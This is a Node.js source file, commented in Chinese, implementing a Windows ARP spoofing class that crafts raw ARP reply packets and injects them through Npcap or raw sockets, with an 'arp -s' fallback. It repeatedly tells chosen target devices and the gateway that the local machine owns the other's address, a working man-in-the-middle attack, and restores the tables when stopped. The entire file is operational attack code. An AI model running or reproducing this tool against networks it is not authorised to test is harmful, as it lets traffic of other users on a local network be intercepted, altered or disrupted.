/**
 * Windows ARP 欺骗实现（改进版）
 * 使用 raw-socket 构造和发送真正的 ARP 包
 */

import { EventEmitter } from 'node:events';
import os from 'node:os';
import { exec } from 'node:child_process';
import { promisify } from 'node:util';
import { macToBytes, ipToBytes } from '../../utils/ip-utils.js';

const execAsync = promisify(exec);

export class Win32ArpSpoofer extends EventEmitter {
  constructor() {
    super();
    this.running = false;
    this.targets = [];
    this.gateway = null;
    this.interfaceName = null;
    this.localIp = null;
    this.localMac = null;
    this.spoofIntervals = [];
    this.rawSocket = null;
    this.useRawSocket = false;
    this.npcap = null;
    this.npcapDevice = null;
    this.useNpcap = false;
    this.npcapBuffer = null;
  }

  /**
   * Initialize Npcap (preferred on Windows).
   */
  async initializeNpcap() {
    try {
      if (process.env.PACKETFORGE_DISABLE_NPCAP === '1') {
        console.warn('[arp] Npcap disabled via env');
        return false;
      }
      const capModule = await import('cap');
      const capExports = capModule.default ?? capModule;
      const Cap = capExports.Cap ?? capExports;
      const findDevice = capExports.findDevice ?? Cap.findDevice;
      const deviceList = capExports.deviceList ?? Cap.deviceList;

      const localIp = this.localIp || this.getLocalIpv4(this.interfaceName);
      this.localIp = localIp;

      let device = null;
      if (localIp && typeof findDevice === 'function') {
        device = findDevice(localIp);
      }

      if (!device && typeof deviceList === 'function') {
        const devices = deviceList();
        if (Array.isArray(devices)) {
          const matchByIp = localIp
            ? devices.find((item) =>
                Array.isArray(item.addresses) &&
                item.addresses.some((addr) => addr.addr === localIp)
              )
            : null;
          const matchByName = this.interfaceName
            ? devices.find((item) => item.description?.includes(this.interfaceName))
            : null;
          const match = matchByIp ?? matchByName ?? devices[0];
          device = match?.name ?? match;
        }
      }

      if (!device) {
        throw new Error('Npcap device not found');
      }

      const cap = new Cap();
      const buffer = Buffer.alloc(65535);
      const bufSize = 10 * 1024 * 1024;
      cap.open(device, 'arp', bufSize, buffer);
      if (typeof cap.setMinBytes === 'function') {
        cap.setMinBytes(0);
      }
      // Drain packets and avoid unhandled error events from cap.
      cap.on('packet', () => {});
      cap.on('error', (error) => {
        console.error('[arp] Npcap error:', error?.message ?? error);
      });

      this.npcap = cap;
      this.npcapBuffer = buffer;
      this.npcapDevice = device;
      this.useNpcap = true;
      console.log('[arp] Using Npcap for ARP spoofing');
      return true;
    } catch (error) {
      this.useNpcap = false;
      this.npcap = null;
      this.npcapDevice = null;
      console.warn('[arp] Npcap not available:', error.message);
      return false;
    }
  }

  /**
   * 初始化 raw socket（如果可用）
   */
  async initializeRawSocket() {
    try {
      const rawSocket = await import('raw-socket');
      this.rawSocket = rawSocket.default || rawSocket;
      this.useRawSocket = true;
      console.log('[arp] Using raw-socket for ARP spoofing');
    } catch (error) {
      console.warn('[arp] raw-socket not available, falling back to static ARP');
      this.useRawSocket = false;
    }
  }

  /**
   * 开始 ARP 欺骗
   * @param {Object} options
   * @param {string} options.interface - 网络接口名称
   * @param {Object} options.gateway - 网关信息 {ip, mac}
   * @param {Array} options.targets - 目标设备列表 [{ip, mac}]
   */
  async startSpoofing({ interface: interfaceName, gateway, targets }) {
    if (this.running) {
      throw new Error('ARP spoofing already running');
    }

    this.interfaceName = interfaceName;
    this.gateway = gateway;
    this.targets = targets;
    this.running = true;
    this.localIp = this.getLocalIpv4(interfaceName);

    // Prefer Npcap on Windows; fall back to raw socket if unavailable.
    const npcapReady = await this.initializeNpcap();
    if (!npcapReady) {
      await this.initializeRawSocket();
    }

    // 获取本地 MAC 地址
    this.localMac = await this.getLocalMac(interfaceName);
    if (!this.localMac) {
      throw new Error('Failed to get local MAC address');
    }

    console.log(`[arp] Starting ARP spoofing on ${interfaceName}`);
    console.log(`[arp] Local MAC: ${this.localMac}`);
    console.log(`[arp] Gateway: ${gateway.ip} (${gateway.mac})`);
    console.log(`[arp] Targets: ${targets.map((t) => t.ip).join(', ')}`);

    // 对每个目标启动双向 ARP 欺骗
    for (const target of targets) {
      await this.spoofTarget(target);
    }

    this.emit('started');
  }

  /**
   * 停止 ARP 欺骗并恢复 ARP 表
   */
  async stopSpoofing() {
    if (!this.running) {
      return;
    }

    console.log('[arp] Stopping ARP spoofing...');

    // 清除所有定时器
    for (const interval of this.spoofIntervals) {
      clearInterval(interval);
    }
    this.spoofIntervals = [];

    // 恢复 ARP 表：发送正确的 ARP 包
    for (const target of this.targets) {
      await this.restoreArp(target);
    }

    this.running = false;
    this.targets = [];
    this.gateway = null;
    this.interfaceName = null;
    this.localIp = null;
    this.localMac = null;
    this.useNpcap = false;
    if (this.npcap) {
      try {
        this.npcap.close();
      } catch (error) {
        console.error('[arp] Failed to close Npcap handle:', error.message);
      }
    }
    this.npcap = null;
    this.npcapDevice = null;
    this.npcapBuffer = null;

    console.log('[arp] ARP spoofing stopped');
    this.emit('stopped');
  }

  /**
   * 添加目标
   */
  async addTarget(target) {
    if (!this.running) {
      throw new Error('ARP spoofing not running');
    }

    this.targets.push(target);
    await this.spoofTarget(target);
  }

  /**
   * 移除目标
   */
  async removeTarget(targetIp) {
    const index = this.targets.findIndex((t) => t.ip === targetIp);
    if (index === -1) {
      return;
    }

    const target = this.targets[index];
    await this.restoreArp(target);

    this.targets.splice(index, 1);
  }

  /**
   * 对单个目标进行 ARP 欺骗
   */
  async spoofTarget(target) {
    console.log(`[arp] Spoofing target: ${target.ip}`);

    // 双向欺骗：
    // 1. 告诉目标："网关的 MAC 是我的 MAC"
    // 2. 告诉网关："目标的 MAC 是我的 MAC"

    const spoofTargetToGateway = async () => {
      await this.sendArpReply(target.ip, target.mac, this.gateway.ip, this.localMac);
    };

    const spoofGatewayToTarget = async () => {
      await this.sendArpReply(this.gateway.ip, this.gateway.mac, target.ip, this.localMac);
    };

    // 立即发送一次
    await spoofTargetToGateway();
    await spoofGatewayToTarget();

    // 每 2 秒发送一次，保持欺骗状态
    const interval = setInterval(async () => {
      try {
        await spoofTargetToGateway();
        await spoofGatewayToTarget();
      } catch (error) {
        console.error('[arp] Spoofing error:', error.message);
      }
    }, 2000);

    this.spoofIntervals.push(interval);
  }

  /**
   * 恢复 ARP 表
   */
  async restoreArp(target) {
    console.log(`[arp] Restoring ARP for: ${target.ip}`);

    // 发送正确的 ARP 包（多次确保生效）
    for (let i = 0; i < 3; i++) {
      await this.sendArpReply(target.ip, target.mac, this.gateway.ip, this.gateway.mac);
      await this.sendArpReply(this.gateway.ip, this.gateway.mac, target.ip, target.mac);
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
  }

  /**
   * 发送 ARP Reply 包
   * @param {string} targetIp - 目标 IP
   * @param {string} targetMac - 目标 MAC
   * @param {string} spoofedIp - 伪装的 IP
   * @param {string} spoofedMac - 伪装的 MAC
   */
  async sendArpReply(targetIp, targetMac, spoofedIp, spoofedMac) {
    if (this.useNpcap && this.npcap) {
      await this.sendArpReplyNpcap(targetIp, targetMac, spoofedIp, spoofedMac);
    } else if (this.useRawSocket && this.rawSocket) {
      await this.sendArpReplyRaw(targetIp, targetMac, spoofedIp, spoofedMac);
    } else {
      await this.sendArpReplyStatic(spoofedIp, spoofedMac);
    }
  }

  /**
   * Send ARP reply using Npcap (link-layer injection).
   */
  async sendArpReplyNpcap(targetIp, targetMac, spoofedIp, spoofedMac) {
    if (!targetMac || !spoofedMac) {
      throw new Error('Missing MAC address for ARP reply');
    }

    try {
      const arpPacket = this.buildArpPacket({
        operation: 2,
        senderMac: spoofedMac,
        senderIp: spoofedIp,
        targetMac,
        targetIp
      });

      this.npcap.send(arpPacket, arpPacket.length);
    } catch (error) {
      console.error('[arp] Npcap send failed:', error.message);
    }
  }

  /**
   * 使用 raw-socket 发送 ARP Reply
   */
  async sendArpReplyRaw(targetIp, targetMac, spoofedIp, spoofedMac) {
    try {
      // 构造 ARP Reply 包
      const arpPacket = this.buildArpPacket({
        operation: 2, // ARP Reply
        senderMac: spoofedMac,
        senderIp: spoofedIp,
        targetMac: targetMac,
        targetIp: targetIp
      });

      // 创建 raw socket（需要管理员权限）
      const socket = this.rawSocket.createSocket({
        protocol: this.rawSocket.Protocol.None,
        addressFamily: this.rawSocket.AddressFamily.IPv4
      });

      // 发送 ARP 包
      socket.send(arpPacket, 0, arpPacket.length, targetIp, (error, bytes) => {
        if (error) {
          console.error('[arp] Failed to send ARP packet:', error.message);
        }
        socket.close();
      });
    } catch (error) {
      console.error('[arp] Raw socket error:', error.message);
      // 回退到静态 ARP
      await this.sendArpReplyStatic(spoofedIp, spoofedMac);
    }
  }

  /**
   * 使用静态 ARP 表项（回退方案）
   */
  async sendArpReplyStatic(spoofedIp, spoofedMac) {
    try {
      const command = `arp -s ${spoofedIp} ${spoofedMac.replace(/:/g, '-')}`;
      await execAsync(command, { windowsHide: true });
    } catch (error) {
      // 静态 ARP 可能失败，忽略错误
    }
  }

  /**
   * 构造 ARP 数据包
   */
  buildArpPacket({ operation, senderMac, senderIp, targetMac, targetIp }) {
    const packet = Buffer.alloc(42); // 以太网头(14) + ARP(28)

    // 以太网头
    const targetMacBytes = macToBytes(targetMac);
    const senderMacBytes = macToBytes(senderMac);

    // 目标 MAC
    for (let i = 0; i < 6; i++) {
      packet[i] = targetMacBytes[i];
    }

    // 源 MAC
    for (let i = 0; i < 6; i++) {
      packet[6 + i] = senderMacBytes[i];
    }

    // 以太网类型：ARP (0x0806)
    packet[12] = 0x08;
    packet[13] = 0x06;

    // ARP 包
    const arpStart = 14;

    // 硬件类型：以太网 (1)
    packet[arpStart + 0] = 0x00;
    packet[arpStart + 1] = 0x01;

    // 协议类型：IPv4 (0x0800)
    packet[arpStart + 2] = 0x08;
    packet[arpStart + 3] = 0x00;

    // 硬件地址长度：6
    packet[arpStart + 4] = 0x06;

    // 协议地址长度：4
    packet[arpStart + 5] = 0x04;

    // 操作：1=Request, 2=Reply
    packet[arpStart + 6] = 0x00;
    packet[arpStart + 7] = operation;

    // 发送者 MAC
    for (let i = 0; i < 6; i++) {
      packet[arpStart + 8 + i] = senderMacBytes[i];
    }

    // 发送者 IP
    const senderIpBytes = ipToBytes(senderIp);
    for (let i = 0; i < 4; i++) {
      packet[arpStart + 14 + i] = senderIpBytes[i];
    }

    // 目标 MAC
    for (let i = 0; i < 6; i++) {
      packet[arpStart + 18 + i] = targetMacBytes[i];
    }

    // 目标 IP
    const targetIpBytes = ipToBytes(targetIp);
    for (let i = 0; i < 4; i++) {
      packet[arpStart + 24 + i] = targetIpBytes[i];
    }

    return packet;
  }

  /**
   * Get local IPv4 for an interface name.
   */
  getLocalIpv4(interfaceName) {
    if (!interfaceName) {
      return null;
    }
    const interfaces = os.networkInterfaces();
    const addresses = interfaces[interfaceName];
    if (!addresses) {
      return null;
    }
    const ipv4 = addresses.find((addr) => addr.family === 'IPv4' && !addr.internal);
    return ipv4?.address ?? null;
  }

  /**
   * 获取本地 MAC 地址
   */
  async getLocalMac(interfaceName) {
    try {
      const { stdout } = await execAsync('getmac /v /fo csv', { windowsHide: true });
      const lines = stdout.split('\n');

      for (const line of lines) {
        if (line.includes(interfaceName) || line.includes('Wi-Fi') || line.includes('Ethernet')) {
          const match = line.match(/([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}/);
          if (match) {
            return match[0].replace(/-/g, ':').toLowerCase();
          }
        }
      }

      // 如果找不到，尝试从第一个非空 MAC
      for (const line of lines) {
        const match = line.match(/([0-9A-Fa-f]{2}-){5}[0-9A-Fa-f]{2}/);
        if (match && !match[0].startsWith('00-00-00')) {
          return match[0].replace(/-/g, ':').toLowerCase();
        }
      }
    } catch (error) {
      console.error('[arp] Failed to get local MAC:', error);
    }

    return null;
  }
}
